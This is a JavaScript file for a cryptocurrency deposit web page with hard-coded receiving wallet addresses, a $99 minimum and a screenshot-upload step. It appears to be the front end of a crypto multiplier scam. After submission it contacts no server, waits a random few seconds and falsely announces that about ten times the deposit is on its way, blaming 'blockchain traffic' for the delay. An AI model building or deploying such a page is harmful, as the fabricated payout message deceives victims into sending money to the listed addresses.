// Crypto minimum amounts and prices
const MINIMUM_USD = 99;
const cryptoPrices = {
    "BTC": 108049,    // $108,049.00
    "ETH": 2508.59,   // $2,508.59
    "BCH": 393.07,    // $393.07
    "DOGE": 0.223325, // $0.223325
    "LTC": 95.81,     // $95.81
    "SOL": 171.97,    // $171.97
    "USDT": 1,        // $1.00 (stablecoin)
    "XRP": 2.32,      // $2.32
    "Trump": 12.79    // $12.79
};

// Minimum amounts for reference:
// BTC:   0.00091642 BTC
// ETH:   0.03946857 ETH
// BCH:   0.25192775 BCH
// DOGE:  443.19117647 DOGE
// LTC:   1.03328254 LTC
// SOL:   0.57567494 SOL
// USDT:  99.00000000 USDT
// XRP:   42.67241379 XRP
// Trump: 7.74040657 TRUMP

const getMinimumCryptoAmount = (crypto) => {
    let amount = MINIMUM_USD / cryptoPrices[crypto];
    // Use different decimal places based on the cryptocurrency
    switch(crypto) {
        case 'BTC':
        case 'ETH':
        case 'BCH':
        case 'SOL':
            return amount.toFixed(8);
        case 'DOGE':
        case 'XRP':
        case 'Trump':
            return amount.toFixed(8);
        case 'LTC':
            return amount.toFixed(8);
        case 'USDT':
            return amount.toFixed(8);
        default:
            return amount.toFixed(8);
    }
};

const data = {
    "BCH": {
      "BEP20": "0x698c85935cf2fed76d596bbb533d2831eede9058",
      "Bitcoin Cash": "1MnL9Ku1PG9ti6erSFtbu7BFecZNJDhCH4",
      "ERC20": "0x698c85935cf2fed76d596bbb533d2831eede9058"
    },
    "BTC": {
      "default": "0x698c85935cf2fed76d596bbb533d2831eede9058"
    },
    "DOGE": {
      "BEP20": "0x698c85935cf2fed76d596bbb533d2831eede9058"
    },
    "ETH": {
      "ERC20": "0x698c85935cf2fed76d596bbb533d2831eede9058"
    },
    "LTC": {
      "BEP20": "0x698c85935cf2fed76d596bbb533d2831eede9058",
      "litecoin": "LTekL2psRuEk6tNXUd6ZjDoNZb8NBJLx6p"
    },
    "SOL": {
      "BEP20": "0x698c85935cf2fed76d596bbb533d2831eede9058",
      "solana chain": "DhNbE4HHUGsBuoo8YPqCFJaoGG8AdFt2aEYUG9kG8qAx"
    },
    "Trump": {
      "solana": "DhNbE4HHUGsBuoo8YPqCFJaoGG8AdFt2aEYUG9kG8qAx"
    },
    "USDT": {
      "BEP20": "0x698c85935cf2fed76d596bbb533d2831eede9058"
    },
    "XRP": {
      "BEP20": "0x698c85935cf2fed76d596bbb533d2831eede9058",
      "ERC20": "0x698c85935cf2fed76d596bbb533d2831eede9058"
    }
  };
  
  const cryptoSelect = document.getElementById("crypto");
  const networkSelect = document.getElementById("network");
  const qrImage = document.getElementById("qrImage");
  const walletAddress = document.getElementById("walletAddress");
  
  // Populate crypto dropdown
  document.addEventListener("DOMContentLoaded", () => {
    cryptoSelect.innerHTML = '<option value="">--Choose Crypto--</option>';
    for (let crypto in data) {
      const option = document.createElement("option");
      option.value = crypto;
      option.textContent = crypto;
      if (crypto === "USDT") option.selected = true; // Set USDT as default
      cryptoSelect.appendChild(option);
    }
  
    // Trigger change event to populate network dropdown
    cryptoSelect.dispatchEvent(new Event("change"));
  
    // Set BEP20 as default for USDT
    if (cryptoSelect.value === "USDT") {
      for (let i = 0; i < networkSelect.options.length; i++) {
        if (networkSelect.options[i].value === "BEP20") {
          networkSelect.selectedIndex = i;
          break;
        }
      }
      // Trigger change event to show QR and address
      networkSelect.dispatchEvent(new Event("change"));
    }
  });
  
  // When crypto changes, populate network dropdown
  cryptoSelect.addEventListener("change", () => {
    const selectedCrypto = cryptoSelect.value;
    networkSelect.innerHTML = '<option value="">--Choose Network--</option>';

    let firstNetwork = null;
    if (data[selectedCrypto]) {
      for (let network in data[selectedCrypto]) {
        const option = document.createElement("option");
        option.value = network;
        option.textContent = network;
        networkSelect.appendChild(option);
        if (!firstNetwork) firstNetwork = network;
      }
    }

    // Auto-select the first network and show QR/address
    if (firstNetwork) {
      networkSelect.value = firstNetwork;
      networkSelect.dispatchEvent(new Event("change"));
    } else {
      qrImage.src = "";
      walletAddress.textContent = "";
    }
  });
  
  // When network changes, show QR code and address
  networkSelect.addEventListener("change", () => {
    const crypto = cryptoSelect.value;
    const network = networkSelect.value;
  
    const address = data[crypto][network];
    walletAddress.textContent = address || "Address not found.";
  
    // Use exact dropdown value for filename, matching your repo
    let filename;
    if (network === "default") {
      filename = `assets/qrcodes/${crypto}.jpg`;
    } else {
      filename = `assets/qrcodes/${crypto}(${network}).jpg`;
    }
    qrImage.src = filename;
  });
  
  // Optional: Copy address to clipboard
  function copyAddress() {
    const text = walletAddress.textContent;
    if (!text || text === "Address not found.") return;
    navigator.clipboard.writeText(text);
    alert("Address copied!");
  }
  
  // Show error message below the amount input
  const amountInput = document.getElementById("amount");
  let amountError = document.createElement("div");
  amountError.style.color = "#f87171";
  amountError.style.fontSize = "0.95em";
  amountError.style.marginBottom = "8px";
  amountInput.parentNode.insertBefore(amountError, amountInput.nextSibling);
  
  // Show success message after submit
  let submitMsg = document.createElement("div");
  submitMsg.style.color = "#22c55e";
  submitMsg.style.fontWeight = "600";
  submitMsg.style.textAlign = "center";
  submitMsg.style.marginTop = "16px";
  document.querySelector('.container').appendChild(submitMsg);
  
  // Update amount placeholder when crypto changes
cryptoSelect.addEventListener("change", function() {
    const selectedCrypto = this.value;
    if (selectedCrypto) {
        const minAmount = getMinimumCryptoAmount(selectedCrypto);
        amountInput.placeholder = `Minimum ${MINIMUM_USD} U$D (${minAmount} ${selectedCrypto})`;
    }
});

amountInput.addEventListener("input", function() {
    const value = amountInput.value;
    const selectedCrypto = cryptoSelect.value;
    // Only allow numbers and dot
    if (!/^\d*\.?\d*$/.test(value)) {
        amountError.textContent = "Please enter a valid number (no special characters).";
    } else {
        const amountInUSD = parseFloat(value) * cryptoPrices[selectedCrypto];
        if (amountInUSD < MINIMUM_USD) {
            const minAmount = getMinimumCryptoAmount(selectedCrypto);
            amountError.textContent = `Minimum amount is ${MINIMUM_USD} U$D (${minAmount} ${selectedCrypto})`;
        } else {
            amountError.textContent = "";
        }
    }
});
  
  function submitForm() {
    const amountValue = amountInput.value;
    const selectedCrypto = cryptoSelect.value;
    const screenshotInput = document.getElementById('screenshot');
    
    if (!/^\d*\.?\d+$/.test(amountValue)) {
      amountError.textContent = "Please enter a valid number (no special characters).";
      submitMsg.textContent = "";
      return;
    }
    
    const amountInUSD = parseFloat(amountValue) * cryptoPrices[selectedCrypto];
    if (amountInUSD < MINIMUM_USD) {
      const minAmount = getMinimumCryptoAmount(selectedCrypto);
      amountError.textContent = `Minimum amount is ${MINIMUM_USD} U$D (${minAmount} ${selectedCrypto})`;
      submitMsg.textContent = "";
      return;
    }
    if (!screenshotInput.files || screenshotInput.files.length === 0) {
      amountError.textContent = "Please upload transaction screenshot.";
      submitMsg.textContent = "";
      return;
    }
    amountError.textContent = "";

    // Show modal overlay
    const modal = document.getElementById('modalOverlay');
    const spinner = document.getElementById('modalSpinner');
    const check = document.getElementById('modalCheck');
    const msg = document.getElementById('modalMsg');
    const okBtn = document.getElementById('modalOkBtn');
    modal.style.display = 'flex';
    spinner.style.display = 'none';
    check.style.display = 'none';
    msg.textContent = '';
    okBtn.style.display = 'none';

    // Show custom spinner wheel and processing text
    spinner.innerHTML = `
      <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;">
        <div class="rzp-spinner" style="width:48px;height:48px;border:6px solid #22c55e;border-top:6px solid #23272f;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:16px;"></div>
        <div style='color:#fff;font-size:1.15rem;margin-top:0;'>Processing...</div>
      </div>
      <style>
        @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
      </style>
    `;
    spinner.style.display = 'block';
    
    // Random delay between 4-20 seconds
    const delay = 4000 + Math.floor(Math.random() * 16000);
    setTimeout(() => {
      spinner.style.display = 'none';
      spinner.innerHTML = '';
      check.style.display = 'block';
      const selectedCrypto = cryptoSelect.value;
      const calculatedAmount = (parseFloat(amountValue) * 10.005).toFixed(2);
      msg.innerHTML = `
        <div style='color:#fff;font-size:1.15rem;margin-bottom:16px;'>Due to blockchain traffic your assets will be reflect in 1-2 business days</div>
        <div style='color:#fff;font-size:1.15rem;'>${calculatedAmount} ${selectedCrypto} Transaction initiated to your Destined address</div>
      `;
      okBtn.style.display = 'block';
      okBtn.onclick = function() {
        modal.style.display = 'none';
        window.location.reload();
      };
    }, delay);
  }